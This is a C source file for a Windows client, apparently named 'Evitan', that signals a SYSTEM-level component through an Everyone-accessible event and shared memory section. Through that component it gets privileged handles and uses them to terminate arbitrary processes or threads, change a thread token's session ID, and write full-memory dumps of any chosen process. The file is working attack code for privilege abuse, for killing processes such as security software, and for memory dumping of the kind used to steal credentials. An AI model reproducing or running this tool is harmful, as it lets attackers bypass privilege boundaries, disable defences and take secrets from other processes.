#include <windows.h>
#include <ntsecapi.h>
#include <stdio.h>
#include <dbghelp.h>
#include <processsnapshot.h>

#include "..\Common\Common.h"

#pragma comment(lib, "ntdll.lib")

void CreateDacl(PACL pDacl)
{
    SID_IDENTIFIER_AUTHORITY identifierAuthority = { 0 };
    identifierAuthority.Value[5] = 0x01; // SECURITY_WORLD_SID_AUTHORITY

    SID everyoneSid;
    memset(&everyoneSid, 0, sizeof(SID));
    everyoneSid.Revision = SID_REVISION;
    everyoneSid.SubAuthorityCount = 1;
    everyoneSid.IdentifierAuthority = identifierAuthority;
    everyoneSid.SubAuthority[0] = SECURITY_WORLD_SID_SUBAUTHORITY;

    // Define DACL on the stack
    unsigned char daclBuffer[ACL_SIZE];
    memset(daclBuffer, 0, ACL_SIZE);

    PACL pStackDacl = (PACL)daclBuffer;
    pStackDacl->AclRevision = ACL_REVISION;
    pStackDacl->AclSize = ACL_SIZE;
    pStackDacl->AceCount = 1;

    // Set the ACE to allow full access to Everyone
    ACCESS_ALLOWED_ACE* pAce = (ACCESS_ALLOWED_ACE*)((char*)pStackDacl + sizeof(ACL));
    pAce->Header.AceType = ACCESS_ALLOWED_ACE_TYPE;
    pAce->Header.AceFlags = 0;
    pAce->Header.AceSize = sizeof(ACCESS_ALLOWED_ACE) + sizeof(SID);
    pAce->Mask = GENERIC_ALL; // Full access
    memcpy(&pAce->SidStart, &everyoneSid, sizeof(SID));

    // Copy the stack-allocated DACL to the provided pointer
    memcpy(pDacl, pStackDacl, ACL_SIZE);
}

void CreateBasicSecurityDescriptor(SECURITY_DESCRIPTOR* pSd, PACL pDacl)
{
    memset(pSd, 0, sizeof(SECURITY_DESCRIPTOR));
    pSd->Revision = SECURITY_DESCRIPTOR_REVISION;
    pSd->Control = SE_DACL_PRESENT;
    pSd->Dacl = pDacl;
}

DWORD ReadDword(LPCSTR prompt)
{
    char input[256];
    DWORD value;
    char* endptr;

    printf(prompt);

    // Read a line of input from the user
    if (fgets(input, sizeof(input), stdin) == NULL) 
    {
        printf("Error reading input.\n");
        exit(1);
    }

    // Convert the string to an unsigned long (DWORD)
    value = strtoul(input, &endptr, 10);

    // Check if the conversion was successful
    if (*endptr != '\0' && *endptr != '\n') 
    {
        printf("Invalid input: non-numeric characters detected.\n");
        exit(1);
    }

    // Check for overflow/underflow conditions
    if (value > UINT_MAX) 
    {
        printf("Input value out of range for DWORD.\n");
        exit(1);
    }

    return value;
}

void InitializeSharedData(PSHARED_DATA data)
{
    data->ClientProcessId = GetCurrentProcessId();
}

void InitializeCommandOpenProcess(PSHARED_DATA data, DWORD processId)
{
    InitializeSharedData(data);
    data->Command = EvitanCommandOpenProcess;
    data->OpenProcessData.ProcessId = processId;
}

void InitializeCommandOpenThread(PSHARED_DATA data, DWORD threadId)
{
    InitializeSharedData(data);
    data->Command = EvitanCommandOpenThread;
    data->OpenThreadData.ThreadId = threadId;
}

void InitializeCommandSetThreadTokenSessionId(PSHARED_DATA data, DWORD threadId, DWORD sessionId)
{
    InitializeSharedData(data);
    data->Command = EvitanCommandSetThreadTokenSessionId;
    data->SetThreadTokenSessionId.ThreadId = threadId;
    data->SetThreadTokenSessionId.SessionId = sessionId;
}

void RunEvitanCommand(PSHARED_DATA data)
{
    HANDLE eventHandle;
    HANDLE sectionHandle;
    PVOID sharedMemoryBase = NULL;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING eventName, sectionName;
    SIZE_T sectionSize = sizeof(SHARED_DATA);
    PSHARED_DATA sharedData;
    SECURITY_DESCRIPTOR sd = { 0 };
    PSECURITY_DESCRIPTOR pSecurityDescriptor = &sd;

    unsigned char daclBuffer[ACL_SIZE];
    PACL pDacl = (PACL)daclBuffer;

    CreateDacl(pDacl);
    CreateBasicSecurityDescriptor(pSecurityDescriptor, pDacl);

    RtlInitUnicodeString(&eventName, EVENT_NAME);
    InitializeObjectAttributes(&objAttr, &eventName, OBJ_CASE_INSENSITIVE, NULL, pSecurityDescriptor);

    // Open the named event
    NTSTATUS status = NtOpenEvent(&eventHandle, EVENT_MODIFY_STATE | SYNCHRONIZE, &objAttr);
    if (status != STATUS_SUCCESS)
    {
        printf("Could not create event. Status: 0x%lX\n", status);
        exit(1);
    }

    RtlInitUnicodeString(&sectionName, SECTION_NAME);
    InitializeObjectAttributes(&objAttr, &sectionName, OBJ_CASE_INSENSITIVE, NULL, pSecurityDescriptor);

    // Open the named shared memory section
    status = NtOpenSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE, &objAttr);
    if (status != STATUS_SUCCESS)
    {
        printf("Could not open section. Status: 0x%lX\n", status);
        NtClose(eventHandle);
        exit(1);
    }

    // Map the section into the address space of the current process
    status = NtMapViewOfSection(sectionHandle, NtCurrentProcess(), &sharedMemoryBase, 0, 0, NULL, (PSIZE_T)&sectionSize, ViewShare, 0, PAGE_READWRITE);
    if (status != STATUS_SUCCESS)
    {
        printf("Could not map view of section. Status: 0x%lX\n", status);
        NtClose(sectionHandle);
        NtClose(eventHandle);
        exit(1);
    }

    // Copy the shared data
    sharedData = (PSHARED_DATA)sharedMemoryBase;
    memcpy(sharedData, data, sizeof(SHARED_DATA));

    // Signal the event to notify the SYSTEM process that the handle is ready
    NtSetEvent(eventHandle, NULL);
    NtClose(eventHandle);

    // Sleep until our command is finished
    Sleep(5000);
    memcpy(data, sharedData, sizeof(SHARED_DATA));
}

BOOL EvitanTerminateProcess()
{
    SHARED_DATA data;
    InitializeCommandOpenProcess(&data, ReadDword("Target PID: "));
    printf("Attempting to terminate PID %lu...\n", data.OpenProcessData.ProcessId);
    RunEvitanCommand(&data);

    printf("Opened process with handle 0x%llX successfully. Terminating...\n", (unsigned long long)data.OpenProcessData.ProcessHandle);
    if (!TerminateProcess(data.OpenProcessData.ProcessHandle, 1))
    {
        printf("Failed to terminate target process: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL EvitanTerminateThread()
{
    SHARED_DATA data;
    InitializeCommandOpenThread(&data, ReadDword("Target TID: "));
    printf("Attempting to terminate TID %lu...\n", data.OpenThreadData.ThreadId);
    RunEvitanCommand(&data);

    printf("Opened thread with handle 0x%llX successfully. Terminating...\n", (unsigned long long)data.OpenThreadData.ThreadHandle);
    if (!TerminateThread(data.OpenThreadData.ThreadHandle, 1))
    {
        printf("Failed to terminate target thread: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL CurrentThreadImpersonateCurrentProcess()
{
    HANDLE hProcessToken = NULL;
    HANDLE hThreadToken = NULL;
    BOOL result;

    result = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hProcessToken);
    if (!result) 
    {
        printf("OpenProcessToken failed with error: %d\n", GetLastError());
        return FALSE;
    }

    result = DuplicateTokenEx(hProcessToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hThreadToken);
    if (!result)
    {
        printf("DuplicateTokenEx failed with error: %d\n", GetLastError());
        CloseHandle(hProcessToken);
        return FALSE;
    }

    result = SetThreadToken(NULL, hThreadToken);
    if (!result) 
    {
        printf("SetThreadToken failed with error: %d\n", GetLastError());
        CloseHandle(hProcessToken);
        CloseHandle(hThreadToken);
        return FALSE;
    }

    CloseHandle(hProcessToken);
    CloseHandle(hThreadToken);
    return TRUE;
}

BOOL EvitanChangeThreadSessionId()
{
    if(!CurrentThreadImpersonateCurrentProcess())
        return FALSE;

    printf("Thread is now impersonating the process token.\n");

    SHARED_DATA data;
    InitializeCommandSetThreadTokenSessionId(&data, GetCurrentThreadId(), ReadDword("Session ID: "));
    RunEvitanCommand(&data);

    return TRUE;
}

#pragma comment(lib, "dbghelp.lib")

BOOL CALLBACK MiniDumpCallback(
    __in     PVOID CallbackParam,
    __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType) 
    {
    case IsProcessSnapshotCallback:
        CallbackOutput->Status = S_FALSE;
        return TRUE;
    case CancelCallback:
        CallbackOutput->Cancel = FALSE;
        CallbackOutput->CheckCancel = FALSE;
        return TRUE;
    case ReadMemoryFailureCallback:
        CallbackOutput->Status = S_OK;
        return TRUE;
    default:
        return TRUE;
    }

    return TRUE;
}

BOOL CreateProcessDump(HANDLE hProcess, DWORD dwProcessId, LPCWSTR dumpFilePath) 
{
    HANDLE hDumpFile = CreateFile(dumpFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDumpFile == INVALID_HANDLE_VALUE) 
    {
        printf("Failed to create dump file: %d\n", GetLastError());
        return FALSE;
    }

    HPSS hSnapshot;
    DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
    NTSTATUS status = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&hSnapshot);
    if (status != STATUS_SUCCESS)
    {
        printf("PssCaptureSnapshot failed: 0x%08X\n", status);
        CloseHandle(hDumpFile);
        return FALSE;
    }

    MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
    ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    CallbackInfo.CallbackRoutine = &MiniDumpCallback;
    CallbackInfo.CallbackParam = NULL;
    BOOL success = MiniDumpWriteDump(hSnapshot, dwProcessId, hDumpFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
    if (!success)
        printf("MiniDumpWriteDump failed: 0x%08X\n", HRESULT_FROM_WIN32(GetLastError()));

    PssFreeSnapshot(GetCurrentProcess(), hSnapshot);
    CloseHandle(hDumpFile);
    
    return success;
}

BOOL EvitanDumpProcessMemory()
{
    SHARED_DATA data;
    InitializeCommandOpenProcess(&data, ReadDword("PID: "));
    printf("Attempting to dump PID %lu...\n", data.OpenProcessData.ProcessId);
    RunEvitanCommand(&data);

    BOOL success = CreateProcessDump(data.OpenProcessData.ProcessHandle, data.OpenProcessData.ProcessId, L".\\process.dmp");

    CloseHandle(data.OpenProcessData.ProcessHandle);
    return success;
}

int main()
{
WrongChoice:
    printf("0 - Exit\n1 - Terminate Process\n2 - Terminate Thread\n3 - Change Thread Session ID\n4 - Dump Process Memory\n");

    DWORD cmd;
    do
    {
        cmd = ReadDword("Command: ");

        switch (cmd)
        {
        case 0:
            break;
        case 1:
            EvitanTerminateProcess();
            break;
        case 2:
            EvitanTerminateThread();
            break;
        case 3:
            EvitanChangeThreadSessionId();
            break;
        case 4:
            EvitanDumpProcessMemory();
            break;
        default:
            goto WrongChoice;
        }

    } while (cmd > 0);
}